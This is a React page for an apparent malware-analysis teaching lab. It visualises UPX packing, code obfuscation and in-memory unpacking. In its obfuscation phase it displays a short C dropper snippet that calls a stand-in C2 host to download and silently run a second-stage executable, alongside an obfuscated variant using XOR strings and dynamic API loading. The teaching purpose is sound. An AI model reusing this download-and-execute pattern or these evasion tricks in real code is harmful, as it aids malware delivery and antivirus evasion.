"use client";

import { useState, useRef, useMemo } from "react";
import { ModulePhaseLayout } from "@/components/layout/ModulePhaseLayout";
import { Canvas, useFrame } from "@react-three/fiber";
import { OrbitControls, Box } from "@react-three/drei";
import { motion, AnimatePresence } from "framer-motion";
import { FileCode, EyeOff, Lock, ArrowRight, Eye, Unlock } from "lucide-react";
import * as THREE from "three";

// ============================================================================
// PHASE 1: Packing Visualizer (3D Entropy Blocks)
// ============================================================================

function EntropyBlock({ position, isPacked, delay }: { position: [number, number, number], isPacked: boolean, delay: number }) {
  const meshRef = useRef<THREE.Mesh>(null);
  
  // Random red/black jitter for high entropy (packed) vs smooth blue/gray for low entropy (unpacked)
  const color = useMemo(() => {
    if (isPacked) {
      return Math.random() > 0.5 ? "#550000" : "#ff0000";
    }
    return Math.random() > 0.8 ? "#3b82f6" : "#1e293b";
  }, [isPacked]);

  useFrame((state) => {
    if (meshRef.current && isPacked) {
      // Jitter effect for packed entropy
      meshRef.current.position.y = position[1] + Math.sin(state.clock.elapsedTime * 10 + delay) * 0.05;
      meshRef.current.rotation.x = Math.sin(state.clock.elapsedTime * 5 + delay) * 0.1;
    } else if (meshRef.current && !isPacked) {
      // Smooth structure for unpacked
      meshRef.current.position.y = position[1];
      meshRef.current.rotation.x = 0;
    }
  });

  return (
    <Box ref={meshRef} args={[0.9, 0.9, 0.9]} position={position}>
      <meshStandardMaterial 
        color={color} 
        emissive={isPacked ? "#aa0000" : "#001133"} 
        emissiveIntensity={isPacked ? 0.8 : 0.2} 
        wireframe={!isPacked && Math.random() > 0.8}
      />
    </Box>
  );
}

function Phase1Packing() {
  const [packed, setPacked] = useState(false);

  // Generate a grid of blocks
  const blocks = useMemo(() => {
    const arr: [number, number, number][] = [];
    for (let x = -4; x <= 4; x++) {
      for (let y = -2; y <= 2; y++) {
        for (let z = -1; z <= 1; z++) {
          arr.push([x, y, z]);
        }
      }
    }
    return arr;
  }, []);

  return (
    <div className="absolute inset-0 bg-[#020202] flex flex-col font-mono text-sm">
      <div className="absolute top-6 left-6 z-10 w-96 bg-black/80 border border-gray-800 rounded-lg p-6 backdrop-blur shadow-2xl">
        <div className="flex items-center justify-between mb-6 pb-4 border-b border-gray-800">
          <div className="flex items-center gap-2 text-gray-300 font-bold">
            <Lock className="w-5 h-5" /> PE Packing (UPX)
          </div>
          <button 
            onClick={() => setPacked(!packed)}
            className={`px-4 py-2 rounded font-bold transition-colors ${packed ? "bg-red-900 text-white" : "bg-blue-900 text-white"}`}
          >
            {packed ? "Unpack Binary" : "Pack Binary (Compress)"}
          </button>
        </div>
        
        <div className="space-y-4">
          <div className="flex justify-between items-center">
            <span className="text-gray-500">File Size:</span>
            <span className={packed ? "text-green-400 font-bold" : "text-gray-300"}>{packed ? "142 KB" : "894 KB"}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-500">Shannon Entropy:</span>
            <span className={packed ? "text-red-500 font-bold" : "text-gray-300"}>{packed ? "7.98 (Encrypted/Compressed)" : "4.12 (Normal Code)"}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-500">Readable Strings:</span>
            <span className={packed ? "text-red-500 font-bold" : "text-gray-300"}>{packed ? "0 (Hidden)" : "1,402 (Visible)"}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-500">Entry Point:</span>
            <span className={packed ? "text-red-500 font-bold" : "text-gray-300"}>{packed ? ".UPX1 (Unpacking Stub)" : ".text (Main)"}</span>
          </div>
        </div>

        <div className={`mt-6 p-4 rounded text-xs ${packed ? "bg-red-950/50 border border-red-900/50 text-red-200" : "bg-blue-950/50 border border-blue-900/50 text-blue-200"}`}>
          {packed 
            ? "The executable's sections (.text, .data) are compressed into a high-entropy blob. Static analysis tools (like string extractors) can no longer read the malicious intent." 
            : "The executable is in its raw, uncompressed state. The code structure, imported APIs, and hardcoded strings are easily readable by antivirus engines."}
        </div>
      </div>

      <Canvas camera={{ position: [0, 0, 10], fov: 60 }}>
        <ambientLight intensity={0.5} />
        <pointLight position={[10, 10, 10]} intensity={1} />
        
        <group rotation={[0.2, -0.4, 0]}>
          {blocks.map((pos, i) => (
            <EntropyBlock key={i} position={pos} isPacked={packed} delay={i} />
          ))}
        </group>

        <OrbitControls enableZoom={false} autoRotate autoRotateSpeed={1} />
      </Canvas>
    </div>
  );
}

// ============================================================================
// PHASE 2: Obfuscation Tactics (Code Diff)
// ============================================================================

function Phase2Obfuscation() {
  const [showClean, setShowClean] = useState(false);

  return (
    <div className="absolute inset-0 bg-[#0a0a0a] p-8 flex flex-col font-mono text-xs">
      
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center gap-3 text-gray-300 font-bold text-sm">
          <EyeOff className="w-5 h-5 text-red-500" /> Control Flow & String Obfuscation
        </div>
        <button 
          onClick={() => setShowClean(!showClean)}
          className="px-6 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded border border-gray-600 transition-colors flex items-center gap-2"
        >
          {showClean ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          {showClean ? "View Obfuscated Malware" : "Deobfuscate (Analyst View)"}
        </button>
      </div>

      <div className="flex-1 flex gap-6">
        
        {/* Code Editor View */}
        <div className="flex-1 bg-[#1e1e1e] border border-gray-700 rounded-lg overflow-hidden flex flex-col shadow-2xl">
          <div className="bg-[#2d2d2d] px-4 py-2 text-gray-400 flex items-center gap-2 border-b border-gray-900">
            <FileCode className="w-4 h-4" /> {showClean ? "payload_clean.c" : "payload_obfuscated.c"}
          </div>
          <div className="flex-1 p-6 overflow-y-auto">
            <AnimatePresence mode="wait">
              {showClean ? (
                <motion.pre key="clean" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="text-gray-300 leading-relaxed">
<span className="text-blue-400">void</span> <span className="text-yellow-300">executePayload</span>() {'{'}
  <span className="text-green-500">{"// Connect to C2 Server"}</span>
  <span className="text-blue-400">char*</span> c2_domain = <span className="text-orange-400">&quot;http://evil-empire-c2.com/drop&quot;</span>;
  <span className="text-blue-400">char*</span> user_agent = <span className="text-orange-400">&quot;Mozilla/5.0 (Windows NT 10.0)&quot;</span>;
  
  <span className="text-blue-400">if</span> (<span className="text-yellow-300">InternetCheckConnection</span>(c2_domain, FLAG_ICC_FORCE_CONNECTION, 0)) {'{'}
    <span className="text-green-500">{"// Download second stage payload"}</span>
    <span className="text-yellow-300">URLDownloadToFile</span>(NULL, c2_domain, <span className="text-orange-400">&quot;C:\\Temp\\stage2.exe&quot;</span>, 0, NULL);
    
    <span className="text-green-500">{"// Execute it"}</span>
    <span className="text-yellow-300">WinExec</span>(<span className="text-orange-400">&quot;C:\\Temp\\stage2.exe&quot;</span>, SW_HIDE);
  {'}'}
{'}'}
                </motion.pre>
              ) : (
                <motion.pre key="obfuscated" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="text-gray-400 leading-relaxed">
<span className="text-blue-400">void</span> <span className="text-yellow-300">sub_4A92F1</span>() {'{'}
  <span className="text-green-600">{"// Control Flow Flattening (Junk Code)"}</span>
  <span className="text-purple-400">int</span> x = 0;
  <span className="text-blue-400">while</span> (x {'<'} 0xDEADBEEF) {'{'}
    x += 14;
    <span className="text-blue-400">if</span> (x == 500) <span className="text-purple-400">goto</span> JUMP_01;
  {'}'}
  
<span className="text-gray-500">JUMP_01:</span>
  <span className="text-green-600">{"// Encrypted Strings (XOR encoded)"}</span>
  <span className="text-blue-400">char</span> s1[] = {'{'} 0x2A, 0x36, 0x36, 0x32, 0x78, 0x67, 0x34, 0x27, ... {'}'};
  <span className="text-blue-400">char</span> s2[] = {'{'} 0x1E, 0x2D, 0x38, 0x22, 0x2B, 0x2A, 0x11, 0x16, ... {'}'};
  <span className="text-yellow-300">xor_decrypt</span>(s1, 0x4F); <span className="text-green-600">{"// Decrypts to C2 domain at runtime"}</span>
  
  <span className="text-green-600">{"// Dynamic API Resolution (No Imports)"}</span>
  <span className="text-blue-400">typedef</span> HRESULT (<span className="text-purple-400">WINAPI</span> *tURLDownloadToFile)(...);
  tURLDownloadToFile pURLDownloadToFile = (tURLDownloadToFile)<span className="text-yellow-300">GetProcAddress</span>(
    <span className="text-yellow-300">LoadLibrary</span>(<span className="text-orange-400">&quot;urlmon.dll&quot;</span>), <span className="text-orange-400">&quot;URLDownloadToFileA&quot;</span>
  );
  
  pURLDownloadToFile(NULL, s1, s2, 0, NULL);
{'}'}
                </motion.pre>
              )}
            </AnimatePresence>
          </div>
        </div>

        {/* Explanation Panel */}
        <div className="w-96 flex flex-col gap-4">
          <div className={`p-4 border rounded-lg transition-colors ${showClean ? "bg-gray-900 border-gray-700 opacity-50" : "bg-red-950/30 border-red-900/50"}`}>
            <h3 className={`font-bold mb-2 ${showClean ? "text-gray-400" : "text-red-400"}`}>1. Junk Code & Dead Loops</h3>
            <p className="text-gray-400">Malware inserts meaningless calculations and `goto` statements to confuse analysts, break decompilers, and alter the file hash.</p>
          </div>
          
          <div className={`p-4 border rounded-lg transition-colors ${showClean ? "bg-gray-900 border-gray-700 opacity-50" : "bg-red-950/30 border-red-900/50"}`}>
            <h3 className={`font-bold mb-2 ${showClean ? "text-gray-400" : "text-red-400"}`}>2. String Encryption</h3>
            <p className="text-gray-400">C2 domains and file paths are stored as XOR-encrypted byte arrays, meaning the `strings` command will return nothing useful during static analysis.</p>
          </div>

          <div className={`p-4 border rounded-lg transition-colors ${showClean ? "bg-gray-900 border-gray-700 opacity-50" : "bg-red-950/30 border-red-900/50"}`}>
            <h3 className={`font-bold mb-2 ${showClean ? "text-gray-400" : "text-red-400"}`}>3. Dynamic API Loading</h3>
            <p className="text-gray-400">Instead of declaring `URLDownloadToFile` in the PE Import Table (which AV flags), the malware locates the function dynamically in memory at runtime.</p>
          </div>
        </div>

      </div>
    </div>
  );
}

// ============================================================================
// PHASE 3: In-Memory Unpacking (IAT Reconstruction)
// ============================================================================

function Phase3Unpacking() {
  const [step, setStep] = useState(0);

  const runUnpacker = async () => {
    setStep(1); // Execute stub
    await new Promise(r => setTimeout(r, 1500));
    setStep(2); // Decrypt payload in RAM
    await new Promise(r => setTimeout(r, 2000));
    setStep(3); // Rebuild IAT
    await new Promise(r => setTimeout(r, 2000));
    setStep(4); // Transfer execution
  };

  return (
    <div className="absolute inset-0 bg-[#051015] p-8 flex flex-col items-center justify-center font-mono">
      <div className="w-full max-w-4xl">
        <div className="flex justify-between items-center mb-8">
          <div className="text-xl font-bold text-white flex items-center gap-3">
            <Unlock className="w-6 h-6 text-green-500" /> Runtime In-Memory Unpacking
          </div>
          <button 
            onClick={runUnpacker}
            disabled={step > 0}
            className="px-6 py-2 bg-green-900 hover:bg-green-800 disabled:opacity-50 text-white font-bold rounded shadow-[0_0_15px_rgba(34,197,94,0.3)] transition-all"
          >
            Execute Packed Binary
          </button>
        </div>

        <div className="flex flex-col md:flex-row gap-8">
          {/* Disk vs RAM visualization */}
          
          <div className="flex-1 flex flex-col gap-2">
            <div className="text-center font-bold text-gray-500 mb-2">HARD DISK (Packed.exe)</div>
            <div className="bg-gray-900 border-2 border-gray-700 p-4 rounded text-center opacity-70">
              <div className="text-gray-400 font-bold mb-1">.UPX0 (Virtual Memory)</div>
              <div className="text-xs text-gray-600">Size: 0 bytes (Empty)</div>
            </div>
            <div className="bg-red-950 border-2 border-red-900 p-4 rounded text-center">
              <div className="text-red-400 font-bold mb-1">.UPX1 (Compressed Payload)</div>
              <div className="text-xs text-red-700">Encrypted AES-256 Blob</div>
            </div>
            <div className="bg-blue-950 border-2 border-blue-900 p-4 rounded text-center relative overflow-hidden">
              <div className="text-blue-400 font-bold mb-1">.UPX2 (Unpacking Stub)</div>
              <div className="text-xs text-blue-300">Execution starts here!</div>
              {step === 1 && <motion.div initial={{ x: "-100%" }} animate={{ x: "100%" }} transition={{ duration: 1, repeat: Infinity }} className="absolute top-0 left-0 w-1/2 h-full bg-blue-500/30 blur-sm" />}
            </div>
          </div>

          <div className="flex items-center justify-center">
            <ArrowRight className="w-8 h-8 text-gray-600" />
          </div>

          <div className="flex-1 flex flex-col gap-2 relative">
            <div className="text-center font-bold text-gray-300 mb-2">SYSTEM RAM (Memory)</div>
            
            <div className={`p-4 rounded border-2 transition-all duration-1000 flex flex-col items-center justify-center min-h-[120px] ${step >= 2 ? "bg-green-950/30 border-green-500" : "bg-gray-900 border-gray-800"}`}>
              {step < 2 ? (
                <span className="text-gray-600">Awaiting Decryption...</span>
              ) : (
                <motion.div initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} className="text-center">
                  <div className="text-green-400 font-bold mb-1">Decrypted Payload (.text)</div>
                  <div className="text-xs text-green-200">Raw Assembly Instructions</div>
                  {step === 4 && <div className="mt-2 text-xs font-bold bg-green-500 text-black px-2 py-1 rounded inline-block animate-pulse">EIP (Instruction Pointer) is here</div>}
                </motion.div>
              )}
            </div>

            <div className={`p-4 rounded border-2 transition-all duration-1000 flex flex-col items-center justify-center min-h-[120px] ${step >= 3 ? "bg-orange-950/30 border-orange-500" : "bg-gray-900 border-gray-800"}`}>
              {step < 3 ? (
                <span className="text-gray-600">Import Address Table (IAT) Broken</span>
              ) : (
                <motion.div initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} className="text-center w-full">
                  <div className="text-orange-400 font-bold mb-2">Rebuilt IAT</div>
                  <div className="text-xs text-orange-200 flex flex-col gap-1 w-full">
                    <div className="bg-black/50 p-1 border border-orange-900/50">KERNEL32.DLL -&gt; VirtualAlloc</div>
                    <div className="bg-black/50 p-1 border border-orange-900/50">USER32.DLL -&gt; GetWindowText</div>
                  </div>
                </motion.div>
              )}
            </div>
          </div>

        </div>
        
        {/* Logs */}
        <div className="mt-8 bg-black border border-gray-800 rounded p-4 h-32 overflow-y-auto text-xs text-gray-500 shadow-inner">
          {step >= 1 && <motion.div initial={{opacity:0}} animate={{opacity:1}}>&gt; OS loader maps packed executable into memory. Execution begins at unpacking stub (.UPX2).</motion.div>}
          {step >= 2 && <motion.div initial={{opacity:0}} animate={{opacity:1}} className="text-blue-400 mt-1">&gt; Stub allocates memory and decrypts/decompresses .UPX1 payload into the empty .UPX0 section.</motion.div>}
          {step >= 3 && <motion.div initial={{opacity:0}} animate={{opacity:1}} className="text-orange-400 mt-1">&gt; Stub loops through imported DLLs using LoadLibrary/GetProcAddress to manually rebuild the Import Address Table (IAT) for the payload.</motion.div>}
          {step >= 4 && <motion.div initial={{opacity:0}} animate={{opacity:1}} className="text-green-400 font-bold mt-1">&gt; Unpacking complete. Stub jumps to the payload&apos;s Original Entry Point (OEP) in memory. Malware is now fully operational in RAM.</motion.div>}
        </div>

      </div>
    </div>
  );
}

// ============================================================================
// MAIN PAGE EXPORT
// ============================================================================

export default function Module2Page() {
  const [phase, setPhase] = useState(0);

  const phases = [
    {
      title: "Packing Visualizer",
      description: "Packers compress and encrypt the executable, destroying its structure and hiding strings, resulting in a high-entropy blob that fools static antivirus scans.",
      component: <Phase1Packing />,
    },
    {
      title: "Obfuscation Tactics",
      description: "Even when unpacked, malware authors use control-flow flattening (junk code), string encryption, and dynamic API loading to thwart manual reverse engineering.",
      component: <Phase2Obfuscation />,
    },
    {
      title: "In-Memory Unpacking",
      description: "To execute, a packed binary must decrypt itself into RAM at runtime. The unpacking stub decrypts the payload and manually rebuilds the Import Address Table (IAT) before jumping to the malicious code.",
      component: <Phase3Unpacking />,
    }
  ];

  return (
    <ModulePhaseLayout
      moduleNumber={2}
      moduleTitle="Obfuscation & Unpacking Lab"
      moduleThreat="ADVANCED"
      phases={phases}
      currentPhase={phase}
      setPhase={setPhase}
    />
  );
}
